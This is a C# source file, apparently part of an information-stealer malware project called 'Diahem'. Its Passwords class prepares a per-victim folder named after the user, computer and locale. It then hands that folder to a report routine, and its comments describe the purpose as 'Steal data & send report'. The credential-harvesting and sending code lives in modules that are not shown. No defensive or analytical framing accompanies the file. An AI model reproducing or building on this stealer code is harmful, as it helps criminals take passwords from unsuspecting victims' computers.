using System;
using System.IO;
using Diahem.Helpers;
using Diahem.Target.System;

namespace Diahem.Target
{
    internal sealed class Passwords
    {
        // Stealer modules
        private static readonly string PasswordsStoreDirectory = Path.Combine(
            Paths.InitWorkDir(),
            SystemInfo.Username + "@" + SystemInfo.Compname + "_" + SystemInfo.Culture);

        // Steal data & send report
        public static string Save()
        {
            Console.WriteLine("Running passwords recovery...");
            if (!Directory.Exists(PasswordsStoreDirectory)) Directory.CreateDirectory(PasswordsStoreDirectory);
            else
                try
                {
                    Filemanager.RecursiveDelete(PasswordsStoreDirectory);
                }
                catch
                {
                    Logging.Log("Stealer >> Failed recursive remove directory with passwords");
                }

            return Report.CreateReport(PasswordsStoreDirectory) ? PasswordsStoreDirectory : "";
        }
    }
}